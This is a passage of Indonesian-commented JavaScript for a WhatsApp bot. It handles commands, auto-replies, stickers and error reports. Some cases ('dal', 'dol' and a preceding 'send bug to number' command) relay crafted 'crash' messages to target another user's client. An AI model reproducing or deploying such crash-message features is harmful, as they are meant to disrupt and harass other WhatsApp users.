//	let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
	//conn.sendMessage(Pe, { text: "halo" }, { quoted: a });
 const muk = [{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }]
conn.send5ButMessage  (Pe, fake, copyright, muk  )
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break    


case 'jadibot':
if (!isPremium) return setReply(mess.only.prem)
jadibot(Araa, from)
break

case 'stopjadibot':
if (!isPremium) return setReply(mess.only.prem)
stopjadibot(Araa, from)
break

case 'dal':
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: mentionByReply} })
let bug = conn.relayMessage(mentionByReply, { reactionMessage: "🗿" }, { messageId: 'crash' })
conn.sendMessage(mentionByReply, { delete: bug.key })
break

case 'dol':{
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: mentionByReply} })
let bug = conn.relayMessage(mentionByReply, { reactionMessage: "🗿" }, { messageId: 'crash' })
conn.sendMessage(mentionByReply, { delete: bug.key })
}
break

case  'ai':{
const { Configuration, OpenAIApi } = require("openai")
const configuration = new Configuration({
  apiKey: openAI,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
              model: "text-davinci-003",
              prompt: q,
              temperature: 0,
              max_tokens: 1000,
              top_p: 1,
              frequency_penalty: 0.2,
              presence_penalty: 0,
            });
const resultnya = response.data.choices[0].text
setReply(resultnya)
}
break
  
//=================================================================================================
    
default:
if (isCmd) {
await Nothing(toFirstCase(command), dash, allcommand)
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
if (mentionByReply) {
xdev.sendButMessage(from, `Command ${prefix+command} tidak ditemukan\nMungkin yang kamu maksud adalah ${prefix+matches.bestMatch.target.toLowerCase()}`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${mentionByReply} ${args[0]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
} else if(args[1] && args[0]){
xdev.sendButMessage(from, `Command ${prefix+command} tidak ditemukan\nMungkin yang kamu maksud adalah ${prefix+matches.bestMatch.target.toLowerCase()}`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${args[0]} ${args[1]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
} else {
xdev.sendButMessage(from, `Command ${prefix+command} tidak ditemukan\nMungkin yang kamu maksud adalah ${prefix+matches.bestMatch.target.toLowerCase()}`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${q}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
}
} 
} 
  
  
//Auto delete sampah
if(isCmd){
let path = require('path');
let directoryPath = path.join();
fs.readdir(directoryPath, async function (err, files) {
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm")   )
let Log = console.log
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`

filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 

if(filteredArray.length > 0){
Log(teks) 
Log("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(file)
});
Log("Berhasil menghapus semua sampah")
}

});
}  //Akhir switch command





if (isImage && autoSticker) {
try{
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (dev.msg || dev).mimetype || ''
if (/image/.test(mime)) {
let img = await xdev.downloadAndSaveMediaMessage(quoted)
wsf = new WSF.Sticker(img, {
pushname, pack: pushname,
type: WSF.StickerTypes.FULL,
author: packName,
crop: true,
})
}        
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer) await xdev.sendMessage(from, { sticker: sticBuffer }, {
quoted: dev,
mimetype: 'image/webp',
ephemeralExpiration: 86400
})
}
}catch(err){

}
}





//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat.whatsapp.com/') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let { dada } = require("../message/sewabot.js")
let teks = dada(prefix, pushname, ucapanWaktu)      
let gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1},
{buttonId: `KODE QR`, buttonText: {displayText: `ᴋᴏᴅᴇ ϙʀ`}, type: 1}]  
xdev.sendButLoc(from, teks,copyright, fs.readFileSync('./stik/thumb.jpeg'), gbutsan)
}

///JikaJika ada yg kirim pesan "bot" botz akan respon✓
if (budy.includes(`Bot`) || budy.includes(`bot`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Bot aktif kak")
}

//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`, text, { quoted: setQuoted, contextInfo: forward })
 }

//Jika ada yang tag nomer owner
if (isGroup && budy.includes(`${nomerOwner}`)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (itsMe) return
const kta =['Iya kak itu nomer owner ada apa 😁','Jangan tag owner ku sedang sibuk 😶','Kenapa kak tag owner ku 🙂']
const su = kta[Math.floor(Math.random() * kta.length)]
addSpam("NotCase",senderNumber, "10s", AntiSpam)
var but = [{buttonId: `${prefix}owner`, buttonText: { displayText: `NOMER OWNER` }, type: 1 }]
xdev.sendMessage(from, { text: su, buttons: but, footer: `© Alvaro Botz`},{quoted: dev})
}
  
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Walaikumsalam kak")
}

///JikaJika ada yg kirim pesan "makasih" botz akan respon✓
if (budy.includes(`akasih`) || budy.includes(`ksih`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Sama-sama kak")
}

//Ketika ada yang minta save
if(!isGroup && budy.startsWith("sv")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Pahami dan baca peraturan bot,\nBot tidak menerima save nomer")
}

//Ketika ada yang minta save
if(!isGroup && budy.startsWith("save")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Pahami dan baca peraturan bot,\nBot tidak menerima save nomer")
}

//Ketika ada yang panggil bot
if(!isGroup && budy.startsWith("Bot")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Bot aktif kak")}                      
  
                       
//Ketika ada yang panggil bot 
if(!isGroup && budy.startsWith("bot")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Bot aktif kak")                      }





















  
} catch (err){
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`)    

if(checkError(err.message, JSON.parse(fs.readFileSync('./database/listerror.json')))) return
addError(err.message, command, JSON.parse(fs.readFileSync('./database/listerror.json')))
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await xdev.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${copyright}\n${calender}`,
buttons: mok,
headerType: 1
}

await xdev.sendMessage(Ownerin, tolol , {quoted: fkontak})

if(!autoblockcmd){
await xdev.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await xdev.downloadAndSaveMediaMessage(quoted)
await xdev.sendMedia (Ownerin, media, dev, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



} catch (err){
console.log(util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await xdev.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 xdev.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
xdev.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}


    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
